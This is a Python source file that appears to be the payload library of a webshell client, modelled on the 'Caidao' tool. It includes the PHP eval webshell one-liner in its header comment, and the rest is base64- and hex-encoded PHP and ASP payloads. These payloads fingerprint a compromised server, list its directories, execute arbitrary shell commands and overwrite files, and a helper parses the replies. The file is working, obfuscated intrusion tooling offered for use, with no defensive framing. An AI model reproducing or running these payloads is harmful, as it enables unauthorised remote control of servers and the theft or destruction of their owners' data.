# coding:utf-8
# c=@eval(base64_decode($_POST[z0]));&z0=ZWNobyhoZWxsbyk7
import base64

'''
    传递的数据,要让shell返回的格式为
    -l>{'xxx':'ccc'}<l-
    其中, -后面的是小写的L  而不是竖线
    具体可以在test.py 里
    打印 filterString(response.content) // 这个只取消注释就行了

'''
def scriptlibs(password, **kwargs):
    phpBase = "{password}=@eval(base64_decode($_POST[z0]));&z0=".format(password=password)
    phpHeadBase = '@ini_set("display_errors","0");@set_time_limit(0);@set_magic_quotes_runtime(0);'

    aspBase = '''eval("Ex"&cHr(101)&"cute(""Server.ScriptTimeout=3600:On Error Resume Next:Function bd(byVal s):For i=1 To Len(s) Step 2:c=Mid(s,i,2):If IsNumeric(Mid(s,i,1)) Then:Execute(""""bd=bd&chr(&H""""&c&"""")""""):Else:Execute(""""bd=bd&chr(&H""""&c&Mid(s,i+2,2)&"""")""""):i=i+2:End If""&chr(10)&""Next:End Function:Response.Write(""""-l>""""):Ex"&cHr(101)&"cute(""""On Error Resume Next:""""&bd(""""{hexreplace}"""")):Response.Write(""""<l-""""):Response.End"")")'''

    path, command, context = "", "", ""
    if kwargs:
        if kwargs.has_key('path'): path = kwargs['path']
        elif kwargs.has_key('command'): command = kwargs['command']
        elif kwargs.has_key('context'): context = kwargs['context']
        else: pass

    retLibs = {
        "php": {
            "abs": {password: "@eval(base64_decode($_POST[z0]));","z0": base64.b64encode(phpHeadBase + '''echo("-l>");$current_dir=dirname($_SERVER['SCRIPT_FILENAME']);$root_all="";$R=array();if($current_dir=="")$current_dir=dirname($_SERVER['PATH_TRANSLATED']);$R['current_dir']=$current_dir;if(substr($D,0,1)!="/"){foreach(range("A","Z") as $L)if(is_dir("{$L}:"))$root_all.="{$L}";}$R['rootall']=$root_all;$u=(function_exists('posix_getegid'))?@posix_getpwuid(@posix_geteuid()):'';$usr=($u)?$u['name']:@get_current_user();$R['os']=php_uname();$R['user']=$usr;print json_encode($R);echo("<l-");die();''')},
            "listdir": {password: "@eval(base64_decode($_POST[z0]));","z0": base64.b64encode(phpHeadBase + '''echo("-l>");$D=base64_decode("'''+ base64.b64encode(path) +'''");$F=@opendir($D);$saveList=array();if($F==NULL){print json_encode(array("code"=>"0"));}else{$M=NULL;$L=NULL;while($N=@readdir($F)){$P=$D."/".$N;if(@is_dir($P))$L=utf8_encode($N."/".$R);else $L=utf8_encode($N.$R);$saveList[]=$L;}print json_encode($saveList);@closedir($F);}echo("<l-");die();''')},
            "command": {password: "@eval(base64_decode($_POST[z0]));", "z0": base64.b64encode(phpHeadBase + '''echo('-l>{"command": "');$s=base64_decode("'''+ base64.b64encode(command) +'''");$d=dirname($_SERVER["SCRIPT_FILENAME"]);@system($s,$ret);print ($ret!=0)?" ret={$ret} ":"";echo('"}<l-');die();''')},
            "write": {password: "@eval(base64_decode($_POST[z0]));", 'z1': base64.b64encode(path), 'z2': base64.b64encode(context),"z0": base64.b64encode(phpHeadBase + '''echo("-l>");$retList = array();$status=@fwrite(fopen(base64_decode($_POST["z1"]),"w"),base64_decode($_POST["z2"]))?"1":"0";$retList["status"]=$status;print json_encode($retList);echo("<l-");die();''')}
        },

        "asp": {
            "abs": {password: aspBase.format(hexreplace="44696d20533a53455420433d4372656174654f626a6563742822536372697074696e672e46696c6553797374656d4f626a65637422293a496620457272205468656e3a533d224552524f523a2f2f2022264572722e4465736372697074696f6e3a4572722e436c6561723a456c73653a533d227b2763757272656e745f646972273a2722265365727665722e4d61707061746828222e22292622272c27726f6f74616c6c273a27223a466f722045616368204420696e20432e4472697665733a533d5326442e44726976654c65747465723a4e6578743a456e642049663a526573706f6e73652e577269746528532622277d2229")},
            "listdir": {"z1": path.encode('hex'), password: '''eval("Ex"&cHr(101)&"cute(""Server.ScriptTimeout=3600:On Error Resume Next:Function bd(byVal s):For i=1 To Len(s) Step 2:c=Mid(s,i,2):If IsNumeric(Mid(s,i,1)) Then:Execute(""""bd=bd&chr(&H""""&c&"""")""""):Else:Execute(""""bd=bd&chr(&H""""&c&Mid(s,i+2,2)&"""")""""):i=i+2:End If""&chr(10)&""Next:End Function:Response.Write(""""-l>[""""):Ex"&cHr(101)&"cute(""""On Error Resume Next:""""&bd(""""44696d2052523a52523d6264285265717565737428227a312229293a53455420433d4372656174654f626a6563742822536372697074696e672e46696c6553797374656d4f626a65637422293a53657420464f3d432e476574466f6c646572282222265252262222293a496620457272205468656e3a526573706f6e73652e57726974652822274552524f523a2f2f2022264572722e4465736372697074696f6e26222722293a4572722e436c6561723a456c73653a466f722045616368204620696e20464f2e737562666f6c646572733a526573706f6e73652e57726974652022272226462e4e616d6526222f272c223a4e6578743a466f722045616368204c20696e20464f2e66696c65733a526573706f6e73652e577269746520222722264c2e4e616d652622272c223a4e6578743a456e64204966"""")):Response.Write(""""]<l-""""):Response.End"")")'''},
            "command": {"z1": "636D64", "z2": command.encode('hex'), password: aspBase.format(hexreplace="53657420583d4372656174654f626a6563742822777363726970742e7368656c6c22292e657865632822222222266264285265717565737428227a3122292926222222202f6320222222266264285265717565737428227a322229292622222222293a496620457272205468656e3a533d225b4572725d2022264572722e4465736372697074696f6e3a4572722e436c6561723a456c73653a4f3d582e5374644f75742e52656164416c6c28293a453d582e5374644572722e52656164416c6c28293a533d4f26453a456e642049663a526573706f6e73652e777269746528227b27636f6d6d616e64273a272226532622277d2229")},
        },

        "jsp": {

        }
    }
    return retLibs

def filterString(string):

    string = string.replace('\\', '/')
    string = string.replace('\'', '"')
    string = string.replace('\r', '')
    string = string.replace('/u', '\\u')
    string = string.replace('\n', '<br>')
    string = string.decode('utf-8', 'ignore')
    string = string.replace(',]', ']')
    return string
